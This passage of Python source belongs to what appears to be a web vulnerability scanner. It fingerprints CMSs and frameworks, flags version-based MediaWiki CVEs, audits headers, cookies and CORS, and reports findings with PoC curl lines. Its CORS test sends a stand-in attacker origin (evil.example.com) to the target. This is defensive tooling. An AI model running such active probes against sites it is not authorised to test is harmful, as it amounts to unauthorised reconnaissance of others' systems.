            fingerprint['cms_guess'] = 'SilverStripe'
        elif 'modx' in content_lower:
            fingerprint['cms_guess'] = 'MODX'
        elif 'craftcms' in content_lower:
            fingerprint['cms_guess'] = 'Craft CMS'
        elif 'statamic' in content_lower:
            fingerprint['cms_guess'] = 'Statamic'
        elif 'grav' in content_lower:
            fingerprint['cms_guess'] = 'Grav'
        elif 'pimcore' in content_lower:
            fingerprint['cms_guess'] = 'Pimcore'
        elif 'processwire' in content_lower:
            fingerprint['cms_guess'] = 'ProcessWire'
        elif 'getkirby' in content_lower:
            fingerprint['cms_guess'] = 'Kirby'
        elif 'jekyll' in content_lower or 'github pages' in content_lower:
            fingerprint['cms_guess'] = 'Jekyll (Static)'
        elif 'hugo' in content_lower:
            fingerprint['cms_guess'] = 'Hugo (Static)'
        elif 'next.js' in content_lower:
            fingerprint['cms_guess'] = 'Next.js (Static/SSR)'
        elif 'nuxt' in content_lower:
            fingerprint['cms_guess'] = 'Nuxt.js (Static/SSR)'
        elif 'moodle' in content_lower:
            fingerprint['cms_guess'] = 'Moodle'
        elif 'opencart' in content_lower:
            fingerprint['cms_guess'] = 'OpenCart'
        elif 'prestashop' in content_lower:
            fingerprint['cms_guess'] = 'PrestaShop'
        
        # MediaWiki specific
        if fingerprint['generator'] and 'MediaWiki' in fingerprint['generator']:
            version_match = re.search(r'MediaWiki (\d+\.\d+\.\d+)', fingerprint['generator'])
            if version_match:
                version = version_match.group(1)
                fingerprint['mediawiki_version'] = version
                v_parts = list(map(int, version.split('.')))
                # CVE-2023-45360: 1.35.12, 1.36–1.39.x before 1.39.5
                if (v_parts[0] == 1 and v_parts[1] == 35 and v_parts[2] >= 12) or \
                   (v_parts[0] == 1 and 36 <= v_parts[1] < 39) or \
                   (v_parts[0] == 1 and v_parts[1] == 39 and v_parts[2] < 5):
                    fingerprint['known_vulns'].append({'description': "CVE-2023-45360: Potentially affected - Stored XSS via i18n messages (unconfirmed, version-based)", 'detected_by': 'version'})
                if (v_parts[0] == 1 and v_parts[1] == 35 and v_parts[2] >= 12) or \
                   (v_parts[0] == 1 and 36 <= v_parts[1] < 39) or \
                   (v_parts[0] == 1 and v_parts[1] == 39 and v_parts[2] < 5):
                    fingerprint['known_vulns'].append({'description': "CVE-2023-45362: Potentially affected - Information leak in diff engine (unconfirmed, version-based)", 'detected_by': 'version'})
                if v_parts[0] == 1 and v_parts[1] == 39 and v_parts[2] < 5:
                    fingerprint['known_vulns'].append({'description': "Potentially affected - Infinite loop on self-redirects with variants (unconfirmed, version-based)", 'detected_by': 'version'})
                if v_parts[0] == 1 and v_parts[1] == 39:
                    fingerprint['known_vulns'].append({'description': "Potentially affected - API DDoS vulnerabilities CVE-2025-61641/61643/61640 (unconfirmed, version-based)", 'detected_by': 'version'})
                if v_parts[0] == 1 and v_parts[1] < 39:
                    fingerprint['known_vulns'].append({'description': "Potentially affected - Private wiki visibility leak CVE-2025-6590 (unconfirmed, version-based)", 'detected_by': 'version'})
        
        # Server stack probing (PHP, DB, ICU, Pygments)
        stack = self._probe_server_stack(target, content, headers)
        if fingerprint.get('mediawiki_version'):
            stack['_mediawiki_version'] = fingerprint['mediawiki_version']
        self._map_component_cves(stack)
        fingerprint['server_stack'] = stack

        # Hardening tips
        if fingerprint['cms_guess'] == 'MediaWiki' and fingerprint['mediawiki_version'] and fingerprint['mediawiki_version'].startswith('1.39'):
            fingerprint['hardening_tips'].extend([
                "Consider rate-limiting access to /w/api.php.",
                "Review extension list and remove unused ones.",
                "Check that the site is updated whenever 1.39.x security releases land."
            ])
        if fingerprint['cms_guess'] == 'WordPress' and fingerprint.get('wordpress_version'):
            v_str = fingerprint['wordpress_version']
            try:
                v_parts = list(map(int, v_str.split('.')))
                if v_parts[0] < 6:
                    fingerprint['hardening_tips'].extend([
                        "Update WordPress to the latest version.",
                        "Use security plugins like Wordfence or Sucuri.",
                        "Regularly update themes and plugins.",
                        "Enable two-factor authentication."
                    ])
            except:
                pass
        if fingerprint['cms_guess'] == 'Joomla' and fingerprint.get('joomla_version'):
            v_str = fingerprint['joomla_version']
            try:
                v_parts = list(map(int, v_str.split('.')))
                if v_parts[0] < 4:
                    fingerprint['hardening_tips'].extend([
                        "Update Joomla to version 4.x or later.",
                        "Use Joomla's built-in security features.",
                        "Install security extensions.",
                        "Regularly backup the site."
                    ])
            except:
                pass
        if fingerprint['cms_guess'] == 'Drupal' and fingerprint.get('drupal_version'):
            v_str = fingerprint['drupal_version']
            try:
                v = int(v_str)
                if v < 9:
                    fingerprint['hardening_tips'].extend([
                        "Upgrade to Drupal 9 or 10.",
                        "Apply security updates promptly.",
                        "Use contributed modules for security.",
                        "Configure proper permissions."
                    ])
            except:
                pass
        
        # Extension vulns
        if 'approvedrevs' in content_lower:
            fingerprint['extension_vulns'].append({'description': "ApprovedRevs extension: Potential stored XSS (check version < 1.39.13, 1.42.7, 1.43.2)", 'detected_by': 'heuristic'})
        if 'embedvideo' in content_lower:
            fingerprint['extension_vulns'].append({'description': "EmbedVideo extension: Potential stored XSS (check version <= 4.0.0)", 'detected_by': 'heuristic'})
        if 'growth experiments' in content_lower or 'growthexperiments' in content_lower:
            fingerprint['extension_vulns'].append({'description': "Growth Experiments extension: Potential XSS (check versions 1.39-1.43)", 'detected_by': 'heuristic'})
        
        # Frontend Frameworks
        if 'data-reactroot' in content or '__REACT_DEVTOOLS_GLOBAL_HOOK__' in content:
            fingerprint['frontend_frameworks'].append('React')
        if '__VUE_DEVTOOLS_GLOBAL_HOOK__' in content or re.search(r'\bv-(?:if|for|bind|on|model|show|slot|cloak)\b', content):
            fingerprint['frontend_frameworks'].append('Vue')
        if 'ng-version' in content:
            fingerprint['frontend_frameworks'].append('Angular')
        if 'svelte' in content_lower and any(s in content for s in ['__svelte', 'svelte-', 'SvelteComponent']):
            fingerprint['frontend_frameworks'].append('Svelte')
        if 'x-data=' in content or ('alpine' in content_lower and 'alpinejs' in content_lower):
            fingerprint['frontend_frameworks'].append('Alpine.js')
        if any(s in content for s in ['ember.js', 'ember.min.js', 'ember-application', '__EMBER_DEVTOOLS_GLOBAL_HOOK__', 'data-ember-action']):
            fingerprint['frontend_frameworks'].append('Ember.js')
        if any(s in content for s in ['backbone.js', 'backbone.min.js', 'Backbone.Model', 'Backbone.View', 'Backbone.Router']):
            fingerprint['frontend_frameworks'].append('Backbone.js')
        if any(s in content for s in ['polymer.html', 'polymer-element', 'polymer.js']):
            fingerprint['frontend_frameworks'].append('Polymer')
        if any(s in content for s in ['mithril.js', 'mithril.min.js', 'm.render', 'm.mount']):
            fingerprint['frontend_frameworks'].append('Mithril')
        if any(s in content for s in ['riot.js', 'riot.min.js', 'riot.mount', 'data-riot']):
            fingerprint['frontend_frameworks'].append('Riot.js')
        if any(s in content for s in ['aurelia-', 'aurelia.js', 'aurelia-bootstrapper']):
            fingerprint['frontend_frameworks'].append('Aurelia')
        
        # Ember-specific checks (only if Ember was positively identified)
        if 'Ember.js' in fingerprint['frontend_frameworks']:
            if '__EMBER_DEVTOOLS_GLOBAL_HOOK__' in content or 'ember-debug' in content_lower:
                fingerprint['known_vulns'].append({'description': 'Ember Debug Tooling Exposed', 'detected_by': 'heuristic'})
            if '{{{unescaped' in content or '{{unescaped' in content:
                fingerprint['known_vulns'].append({'description': 'Potential Unsafe Ember Helpers (unescaped output)', 'detected_by': 'heuristic'})
            if 'this.route(' in content or 'router.map(' in content:
                fingerprint['known_vulns'].append({'description': 'Potential Leaked Ember Routes', 'detected_by': 'heuristic'})
        
        # Backend Frameworks
        if 'laravel' in fingerprint['x_powered_by'].lower() or 'laravel_session' in headers.get('Set-Cookie', ''):
            fingerprint['backend_frameworks'].append('Laravel')
        if 'symfony' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Symfony')
        if 'x-runtime' in headers:
            fingerprint['backend_frameworks'].append('Ruby on Rails')
        if 'csrftoken' in headers.get('Set-Cookie', '') or 'django' in content_lower:
            fingerprint['backend_frameworks'].append('Django')
        if 'express' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Express.js')
        if 'flask' in fingerprint['x_powered_by'].lower() or 'werkzeug' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Flask')
        if 'fastapi' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('FastAPI')
        if 'spring' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Spring')
        if 'play' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Play Framework')
        if 'ktor' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Ktor')
        if 'gin' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Gin (Go)')
        if 'echo' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Echo (Go)')
        if 'rails' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Ruby on Rails')
        
        # CDN / Cloud Services
        if 'cf-ray' in headers:
            fingerprint['cdn_services'].append('Cloudflare')
        if 'akamai' in fingerprint['server'].lower():
            fingerprint['cdn_services'].append('Akamai')
        if 'x-amz-cf-id' in headers:
            fingerprint['cdn_services'].append('AWS CloudFront')
        if 'fastly' in headers:
            fingerprint['cdn_services'].append('Fastly')
        if 'google' in fingerprint['server'].lower():
            fingerprint['cdn_services'].append('Google Cloud CDN')
        
        # E-commerce Platforms
        if 'woocommerce' in content_lower:
            fingerprint['ecommerce_platforms'].append('WooCommerce')
        if 'prestashop' in content_lower:
            fingerprint['ecommerce_platforms'].append('PrestaShop')
        if 'bigcommerce' in content_lower:
            fingerprint['ecommerce_platforms'].append('BigCommerce')
        if 'opencart' in content_lower:
            fingerprint['ecommerce_platforms'].append('OpenCart')
        if 'oscommerce' in content_lower:
            fingerprint['ecommerce_platforms'].append('osCommerce')
        
        # Analytics / Tracking
        if 'googletagmanager' in content_lower or 'gtag' in content_lower:
            fingerprint['analytics_tracking'].append('Google Analytics')
        if 'facebook' in content_lower or 'fbq' in content_lower:
            fingerprint['analytics_tracking'].append('Meta Pixel')
        if 'cloudflareinsights' in content_lower:
            fingerprint['analytics_tracking'].append('Cloudflare Web Analytics')
        if 'matomo' in content_lower or 'piwik' in content_lower:
            fingerprint['analytics_tracking'].append('Matomo / Piwik')
        if 'hotjar' in content_lower:
            fingerprint['analytics_tracking'].append('Hotjar')
        if 'mixpanel' in content_lower:
            fingerprint['analytics_tracking'].append('Mixpanel')
        if 'segment' in content_lower:
            fingerprint['analytics_tracking'].append('Segment')
        if 'plausible' in content_lower:
            fingerprint['analytics_tracking'].append('Plausible')
        if 'amplitude' in content_lower:
            fingerprint['analytics_tracking'].append('Amplitude')
        if 'fullstory' in content_lower:
            fingerprint['analytics_tracking'].append('FullStory')
        if 'crazyegg' in content_lower:
            fingerprint['analytics_tracking'].append('Crazy Egg')
        if 'mouseflow' in content_lower:
            fingerprint['analytics_tracking'].append('Mouseflow')
        if 'chartbeat' in content_lower:
            fingerprint['analytics_tracking'].append('Chartbeat')
        if 'quantcast' in content_lower:
            fingerprint['analytics_tracking'].append('Quantcast')
        if 'comscore' in content_lower:
            fingerprint['analytics_tracking'].append('comScore')
        if 'alexa' in content_lower:
            fingerprint['analytics_tracking'].append('Alexa')
        
        # Security / WAF
        if self.waf_detected:
            fingerprint['security_waf'].append('WAF Detected')
        
        # Miscellaneous
        jquery_match = re.search(r'jquery[/-](\d+\.\d+\.\d+)', content_lower)
        if jquery_match:
            fingerprint['miscellaneous'].append(f"jQuery {jquery_match.group(1)}")
        if any(s in content_lower for s in ['bootstrap.min.css', 'bootstrap.min.js', 'bootstrap.css', 'bootstrap.js', 'bootstrap.bundle']):
            fingerprint['miscellaneous'].append('Bootstrap')
        if any(s in content_lower for s in ['tailwind.css', 'tailwindcss', 'tailwind.min.css']):
            fingerprint['miscellaneous'].append('Tailwind')
        if 'fonts.googleapis.com' in content_lower:
            fingerprint['miscellaneous'].append('Google Fonts')
        if any(s in content_lower for s in ['stripe.com/v', 'stripe.js', 'js.stripe.com']):
            fingerprint['miscellaneous'].append('Stripe')
        if any(s in content_lower for s in ['paypal.com/sdk', 'paypalobjects.com', 'paypal-button']):
            fingerprint['miscellaneous'].append('PayPal')
        if any(s in content_lower for s in ['braintree-web', 'braintreegateway', 'braintree.js']):
            fingerprint['miscellaneous'].append('Braintree')
        if 'font-awesome' in content_lower or any(s in content for s in ['fa fa-', 'fas fa-', 'far fa-', 'fab fa-', 'fontawesome']):
            fingerprint['miscellaneous'].append('Font Awesome')
        if any(s in content_lower for s in ['materialize.min.css', 'materialize.min.js', 'materialize.css']):
            fingerprint['miscellaneous'].append('Materialize CSS')
        if any(s in content_lower for s in ['bulma.css', 'bulma.min.css', 'bulma.io']):
            fingerprint['miscellaneous'].append('Bulma')
        if any(s in content_lower for s in ['foundation.min.css', 'foundation.min.js', 'foundation.css']):
            fingerprint['miscellaneous'].append('Foundation')
        if 'semantic-ui' in content_lower or 'semantic.min' in content_lower:
            fingerprint['miscellaneous'].append('Semantic UI')
        if any(s in content_lower for s in ['uikit.min', 'uikit.js', 'uikit.css']):
            fingerprint['miscellaneous'].append('UIkit')
        if any(s in content_lower for s in ['axios.min.js', 'axios.js', 'axios/']):
            fingerprint['miscellaneous'].append('Axios')
        if any(s in content_lower for s in ['lodash.min.js', 'lodash.js', 'lodash/']):
            fingerprint['miscellaneous'].append('Lodash')
        if any(s in content_lower for s in ['moment.min.js', 'moment.js', 'moment/']):
            fingerprint['miscellaneous'].append('Moment.js')
        if 'chart.js' in content_lower or 'chart.min.js' in content_lower:
            fingerprint['miscellaneous'].append('Chart.js')
        if any(s in content for s in ['d3.js', 'd3.min.js', 'd3.v', 'd3.select', 'd3.scale', 'd3.svg']):
            fingerprint['miscellaneous'].append('D3.js')
        if any(s in content_lower for s in ['leaflet.js', 'leaflet.min.js', 'leaflet.css', 'l.tilelayer', 'l.map(']):
            fingerprint['miscellaneous'].append('Leaflet')
        if any(s in content_lower for s in ['mapbox-gl', 'api.mapbox.com', 'mapbox.js']):
            fingerprint['miscellaneous'].append('Mapbox')
        if 'disqus.com' in content_lower or 'disqus_shortname' in content_lower:
            fingerprint['miscellaneous'].append('Disqus')
        if 'recaptcha' in content_lower:
            fingerprint['miscellaneous'].append('reCAPTCHA')
        if 'hcaptcha' in content_lower:
            fingerprint['miscellaneous'].append('hCaptcha')
        
        # Security Headers
        fingerprint['security_headers'] = {
            'Content-Security-Policy': headers.get('Content-Security-Policy', 'Missing'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security', 'Missing'),
            'X-Frame-Options': headers.get('X-Frame-Options', 'Missing'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options', 'Missing'),
            'Referrer-Policy': headers.get('Referrer-Policy', 'Missing'),
            'Permissions-Policy': headers.get('Permissions-Policy', 'Missing'),
            'X-XSS-Protection': headers.get('X-XSS-Protection', 'Missing')
        }
        
        # SSL
        fingerprint['ssl_enabled'] = target.startswith('https://')

        # CORS Analysis
        cors_issues = []
        acao = headers.get('Access-Control-Allow-Origin', '')
        acac = headers.get('Access-Control-Allow-Credentials', '').lower()
        if acao == '*':
            if acac == 'true':
                cors_issues.append('CRITICAL: Access-Control-Allow-Origin: * with Allow-Credentials: true')
            else:
                cors_issues.append('Wildcard Access-Control-Allow-Origin (*)  - review if intentional')
        elif acao and acao != 'Missing':
            cors_issues.append(f'Access-Control-Allow-Origin set to: {acao}')
        try:
            cors_test_headers = {"User-Agent": self.current_user_agent, "Origin": "https://evil.example.com"}
            cors_resp = self.session.get(target, headers=cors_test_headers, timeout=5, verify=self.verify_ssl)
            self._inc_requests()
            reflected_origin = cors_resp.headers.get('Access-Control-Allow-Origin', '')
            if reflected_origin == 'https://evil.example.com':
                cors_issues.append('CRITICAL: Origin reflection detected - server reflects arbitrary Origin header')
            if cors_resp.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true' and reflected_origin == 'https://evil.example.com':
                cors_issues.append('CRITICAL: Reflected origin with credentials allowed - full CORS bypass')
        except Exception:
            pass
        fingerprint['cors_issues'] = cors_issues

        # Cookie Security Analysis
        cookie_issues = []
        set_cookies = headers.get('Set-Cookie', '')
        if set_cookies:
            cookies_raw = set_cookies if isinstance(set_cookies, list) else [set_cookies]
            for cookie_str in cookies_raw:
                cookie_name = cookie_str.split('=', 1)[0].strip() if '=' in cookie_str else cookie_str.split(';')[0].strip()
                cookie_lower = cookie_str.lower()
                issues = []
                if 'httponly' not in cookie_lower:
                    issues.append('missing HttpOnly')
                if 'secure' not in cookie_lower:
                    issues.append('missing Secure')
                if 'samesite' not in cookie_lower:
                    issues.append('missing SameSite')
                elif 'samesite=none' in cookie_lower:
                    issues.append('SameSite=None')
                if issues:
                    cookie_issues.append(f'{cookie_name}: {", ".join(issues)}')
        fingerprint['cookie_issues'] = cookie_issues

        # Risk Score and Recommendations
        risk_score = 0
        recommendations = []
        critical_headers = ['Content-Security-Policy', 'Strict-Transport-Security', 'X-Frame-Options', 'X-Content-Type-Options']
        for header in critical_headers:
            if fingerprint['security_headers'][header] == 'Missing':
                risk_score += 15
                if header == 'Content-Security-Policy':
                    recommendations.append("Implement a Content Security Policy (CSP) to prevent XSS and other injection attacks.")
                elif header == 'Strict-Transport-Security':
                    recommendations.append("Enable HTTP Strict Transport Security (HSTS) with 'max-age=31536000; includeSubDomains; preload'.")
                elif header == 'X-Frame-Options':
                    recommendations.append("Set X-Frame-Options to 'DENY' or 'SAMEORIGIN' to prevent clickjacking.")
                elif header == 'X-Content-Type-Options':
                    recommendations.append("Set X-Content-Type-Options to 'nosniff' to prevent MIME type sniffing.")
        if not fingerprint['ssl_enabled']:
            risk_score += 20
            recommendations.append("Enforce HTTPS for all connections.")
        if any('CRITICAL' in issue for issue in cors_issues):
            risk_score += 20
            recommendations.append("Fix CORS misconfiguration - do not reflect arbitrary origins or combine wildcard with credentials.")
        elif cors_issues:
            risk_score += 5
        if cookie_issues:
            risk_score += 10
            recommendations.append("Set HttpOnly, Secure, and SameSite attributes on all cookies.")
        component_cves = fingerprint.get('server_stack', {}).get('component_cves', [])
        remote_critical = [c for c in component_cves if c.get('severity') == 'critical' and c.get('exploitability', '') in ('remote-unauth', 'remote-auth')]
        remote_high = [c for c in component_cves if c.get('severity') == 'high' and c.get('exploitability', '') in ('remote-unauth', 'remote-auth')]
        local_critical = [c for c in component_cves if c.get('severity') == 'critical' and c.get('exploitability', '') not in ('remote-unauth', 'remote-auth')]
        if remote_critical:
            risk_score += 25
            recommendations.append(f"URGENT: {len(remote_critical)} remotely exploitable critical CVE(s) — update immediately.")
        if remote_high:
            risk_score += 15
            recommendations.append(f"{len(remote_high)} remotely exploitable high-severity CVE(s) — plan updates soon.")
        if local_critical:
            risk_score += 10
            recommendations.append(f"{len(local_critical)} critical CVE(s) requiring local/authenticated access — update when possible.")
        fingerprint['risk_score'] = min(risk_score, 100)
        fingerprint['recommendations'] = recommendations
        
        # Robots.txt and Sitemap
        try:
            robots_url = urljoin(target, '/robots.txt')
            robots_response = self.session.get(robots_url, timeout=5, verify=self.verify_ssl)
            self._inc_requests()
            if robots_response.status_code == 200:
                fingerprint['robots_txt'] = 'Present'
                disallowed = [line.split(':', 1)[1].strip() for line in robots_response.text.split('\n') if line.lower().startswith('disallow:') and ':' in line]
                fingerprint['robots_disallowed'] = disallowed[:10]
            else:
                fingerprint['robots_txt'] = 'Missing'
        except RuntimeError as e:
            if "Max requests exceeded" in str(e):
                fingerprint['robots_txt'] = 'Unknown (max requests reached)'
            else:
                fingerprint['robots_txt'] = 'Error'
        except Exception:
            fingerprint['robots_txt'] = 'Error'
        
        try:
            sitemap_url = urljoin(target, '/sitemap.xml')
            sitemap_response = self.session.get(sitemap_url, timeout=5, verify=self.verify_ssl)
            self._inc_requests()
            if sitemap_response.status_code == 200:
                fingerprint['sitemap_xml'] = 'Present'
            else:
                fingerprint['sitemap_xml'] = 'Missing'
        except RuntimeError as e:
            if "Max requests exceeded" in str(e):
                fingerprint['sitemap_xml'] = 'Unknown (max requests reached)'
            else:
                fingerprint['sitemap_xml'] = 'Error'
        except Exception:
            fingerprint['sitemap_xml'] = 'Error'
        
        return fingerprint

def load_banner() -> str:
    """Load a random banner from the banners directory."""
    banner_dir = Path(__file__).parent / "banners"
    banner_files = list(banner_dir.glob("*.txt"))
    if not banner_files:
        return "Common Web Application Vulnerability Scanner"
    try:
        with random.choice(banner_files).open("r", encoding="utf-8") as f:
            return f.read()
    except UnicodeDecodeError as e:
        logger.warning("Failed to decode banner file: %s", e)
        return "Common Web Application Vulnerability Scanner"

class Reporter:
    """Handles output formatting and reporting."""

    def __init__(self):
        pass

    def display_results(self, results: List[Tuple[str, str, List[Tuple[str, str, float, str, int]], str, str]], waf_detected: bool, requests_count: int, time_taken: float):
        """Display scan results in a formatted table with matched strings and confidence."""
        if not results:
            print("\nNo vulnerabilities found at or above selected minimum severity.")
            return
        severity_order = {'low': 0, 'medium': 1, 'high': 2, 'critical': 3}
        results.sort(key=lambda r: (-severity_order.get(r[4], 1), -max([m[2] for m in r[2]] or [0])))
        headers = [Fore.YELLOW + "Vulnerability" + Style.RESET_ALL, Fore.YELLOW + "Status" + Style.RESET_ALL, Fore.YELLOW + "Confidence" + Style.RESET_ALL, Fore.YELLOW + "Match Type" + Style.RESET_ALL, Fore.YELLOW + "Detected By" + Style.RESET_ALL, Fore.YELLOW + "Severity" + Style.RESET_ALL]
        table_data = [
            (name, status, f"{max([m[2] for m in matches] or [0]):.0%}" if matches else "N/A", ", ".join(set(m[3] for m in matches)) if matches else "N/A", detected_by, severity)
            for name, status, matches, detected_by, severity in results
        ]
        print("\n" + Fore.CYAN + "Vulnerability Scan Results:" + Style.RESET_ALL + "\n")
        print(tabulate(table_data, headers=headers, tablefmt="grid"))

        if waf_detected:
            print("\n" + Fore.YELLOW + "Warning: Web Application Firewall (WAF) detected. Some active tests were skipped or may be blocked, affecting results." + Style.RESET_ALL)

        print("\n" + Fore.CYAN + "Details of Vulnerable Findings:" + Style.RESET_ALL)
        for name, status, matches, _, severity in results:
            if clean_ansi(status) == "Vulnerable" and matches:
                print(f"\nVulnerability: {name}")
                print("Matched Strings:")
                for m in matches[:5]:
                    context_str = m[0]
                    match_str = m[1]
                    confidence = m[2]
                    match_type = m[3]
                    count = m[4]
                    poc = m[5] if len(m) > 5 else None
                    display_match = match_str if len(match_str) <= 200 else match_str[:197] + "..."
                    display_context = context_str if len(context_str) <= 120 else context_str[:117] + "..."
                    note = ""
                    if name == "Directory Traversal" and match_type == "Passive":
                        note = "Likely safe relative path in HTML attribute"
                    elif name == "Directory Traversal" and "WAF" in match_str:
                        note = "Possible false positive due to WAF block"
                    elif name == "Cross-Domain Scripting" and match_type == "Passive":
                        note = "Likely safe script source"
                    elif name == "Cross-Site Script Inclusion (CSSI)" and match_type == "Passive":
                        note = "Likely safe stylesheet source"
                    print(f"- {display_match} (Occurrences: {count}, Context: ...{display_context}..., Confidence: {confidence:.0%}, Type: {match_type}{', Note: ' + note if note else ''})")
                    if poc and match_type == "Active":
                        print(f"  {Fore.CYAN}PoC:{Style.RESET_ALL}")
                        print(f"    curl:     {poc.get('curl', 'N/A')}")
                        if poc.get('browser'):
                            print(f"    browser:  {poc['browser']}")
                        print(f"    evidence: {poc.get('evidence', 'N/A')}")
                if len(matches) > 5:
                    print(f"... and {len(matches) - 5} more matches")

        print(f"\nScan stats: {requests_count} HTTP requests in {time_taken:.2f} seconds.")

    def export_results(self, results: List[Tuple[str, str, List[Tuple[str, str, float, str, int]], str, str]], output_file: str):
        """Export scan results to JSON or CSV."""
        if output_file.endswith('.json'):
            data = []
            for name, status, matches, detected_by, severity in results:
                match_list = []
                for m in matches:
                    poc = m[5] if len(m) > 5 else None
                    entry = {
                        "context": m[0],
                        "match": m[1],
                        "confidence": m[2],
                        "match_type": m[3],
                        "occurrences": m[4],
                    }
                    if poc:
                        entry["poc"] = poc
                    match_list.append(entry)
                data.append({
                    "Vulnerability": name,
                    "Status": clean_ansi(status),
                    "Confidence": f"{max([m[2] for m in matches] or [0]):.0%}" if matches else "N/A",
                    "MatchType": ", ".join(set(m[3] for m in matches)) if matches else "N/A",
                    "DetectedBy": detected_by,
                    "Severity": severity,
                    "Matches": match_list,
                })
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2)
        elif output_file.endswith('.csv'):
            with open(output_file, 'w', encoding='utf-8', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(["Vulnerability", "Status", "Confidence", "Match Type", "Matches", "DetectedBy", "Severity"])
                for name, status, matches, detected_by, severity in results:
                    status_clean = clean_ansi(status)
                    confidence = f"{max([m[2] for m in matches] or [0]):.0%}" if matches else "N/A"
                    match_type = ", ".join(set(m[3] for m in matches)) if matches else "N/A"
                    matches_str = "; ".join([
                        f"{m[1]} (Occurrences: {m[4]}, Context: {m[0]}, Confidence: {m[2]:.0%}, Type: {m[3]}, Note: {'Likely safe relative path in HTML attribute' if name == 'Directory Traversal' and m[3] == 'Passive' else 'Possible false positive due to WAF block' if name == 'Directory Traversal' and 'WAF' in m[1] else 'Likely safe script source' if name == 'Cross-Domain Scripting' and m[3] == 'Passive' else 'Likely safe stylesheet source' if name == 'Cross-Site Script Inclusion (CSSI)' and m[3] == 'Passive' else ''})"
                        for m in matches
                    ])
                    writer.writerow([name, status_clean, confidence, match_type, matches_str, detected_by, severity])

    def display_fingerprint(self, scanner, page, target, args):
        """Display server fingerprinting information."""
        url, status, content, headers = page
        fingerprint = scanner.fingerprint(content, headers, target)
        print(f"\nServer Fingerprinting:")
        print(f"- Server: {fingerprint['server']}")
        print(f"- X-Powered-By: {fingerprint['x_powered_by']}")
        print(f"- OS Guess: {fingerprint['os_guess']}")
        if fingerprint['programming_languages']:
            print(f"- Programming Languages:")
            for lang in fingerprint['programming_languages']:
                print(f"  - {lang}")
        if fingerprint['generator']:
            print(f"- Generator: {fingerprint['generator']}")
        print(f"- CMS Guess: {fingerprint['cms_guess']}")
        if fingerprint.get('wordpress_version'):
            print(f"- WordPress Version: {fingerprint['wordpress_version']}")
        if fingerprint.get('joomla_version'):
            print(f"- Joomla Version: {fingerprint['joomla_version']}")
        if fingerprint.get('drupal_version'):
            print(f"- Drupal Version: {fingerprint['drupal_version']}")
        if fingerprint['mediawiki_version']:
            print(f"- MediaWiki Version: {fingerprint['mediawiki_version']}")
        stack = fingerprint.get('server_stack', {})
        if stack.get('php_version'):
            print(f"- PHP Version: {stack['php_version']}")
        if stack.get('db_type'):
            db_str = stack['db_type']
            if stack.get('db_version'):
                db_str += f" {stack['db_version']}"
            print(f"- Database: {db_str}")
        if stack.get('icu_version'):
            print(f"- ICU Version: {stack['icu_version']}")
        if stack.get('pygments_version'):
            print(f"- Pygments Version: {stack['pygments_version']}")
        if stack.get('lua_version'):
            print(f"- Lua Version: {stack['lua_version']}")
        if stack.get('python_version'):
            print(f"- Python Version: {stack['python_version']}")
        if stack.get('component_cves'):
            actionable = [c for c in stack['component_cves'] if c.get('severity') not in ('info',)]
            informational = [c for c in stack['component_cves'] if c.get('severity') == 'info']
            if actionable:
                print(f"- Component CVEs ({len(actionable)} actionable):")
                for cve_info in actionable:
                    sev = cve_info.get('severity', 'medium')
                    color = Fore.RED if sev == 'critical' else Fore.YELLOW if sev == 'high' else Fore.CYAN
                    exploit = cve_info.get('exploitability', 'unknown')
                    fixed = cve_info.get('fixed_in', '')
                    fixed_str = f" | Fix: {fixed}" if fixed and fixed != 'N/A' else ''
                    print(f"  - {color}[{sev.upper()}] {cve_info['component']} - {cve_info['cve']}: {cve_info['description']} [{exploit}]{fixed_str}{Style.RESET_ALL}")
            if informational:
                print(f"- Component Status ({len(informational)} clear):")
                for cve_info in informational:
                    print(f"  - {Fore.GREEN}[OK] {cve_info['component']}: {cve_info['description']}{Style.RESET_ALL}")
        else:
            print(f"- Component CVEs: No version data available for CVE mapping")

        if fingerprint['known_vulns']:
            print(f"- Known Vulnerabilities:")
            for vuln in fingerprint['known_vulns']:
                print(f"  - [{vuln['detected_by'].upper()}] {vuln['description']}")
        if fingerprint['extension_vulns']:
            print(f"- Potential Extension Vulnerabilities:")
            for vuln in fingerprint['extension_vulns']:
                print(f"  - [{vuln['detected_by'].upper()}] {vuln['description']}")
        if fingerprint['frontend_frameworks']:
            print(f"- Frontend Frameworks:")
            for fw in fingerprint['frontend_frameworks']:
                print(f"  - {fw}")
        if fingerprint['backend_frameworks']:
            print(f"- Backend Frameworks:")
            for bw in fingerprint['backend_frameworks']:
                print(f"  - {bw}")
        if fingerprint['cdn_services']:
            print(f"- CDN / Cloud Services:")
            for cdn in fingerprint['cdn_services']:
                print(f"  - {cdn}")
        if fingerprint['ecommerce_platforms']:
            print(f"- E-commerce Platforms:")
            for ec in fingerprint['ecommerce_platforms']:
                print(f"  - {ec}")
        if fingerprint['analytics_tracking']:
            print(f"- Analytics / Tracking:")
            for at in fingerprint['analytics_tracking']:
                print(f"  - {at}")
        if fingerprint['security_waf']:
            print(f"- Security / WAF:")
            for sec in fingerprint['security_waf']:
                print(f"  - {sec}")
        if fingerprint['miscellaneous']:
            print(f"- Miscellaneous:")
            for misc in fingerprint['miscellaneous']:
                print(f"  - {misc}")
        
        if fingerprint['security_headers']:
            print(f"- Security Headers:")
            for header, value in fingerprint['security_headers'].items():
                status = "Present" if value != 'Missing' else "Missing"
                print(f"  - {header}: {status}")
        
        if fingerprint.get('cors_issues'):
            print(f"- CORS Issues:")
            for issue in fingerprint['cors_issues']:
                color = Fore.RED if 'CRITICAL' in issue else Fore.YELLOW
                print(f"  - {color}{issue}{Style.RESET_ALL}")
        else:
            print(f"- CORS: No issues detected")

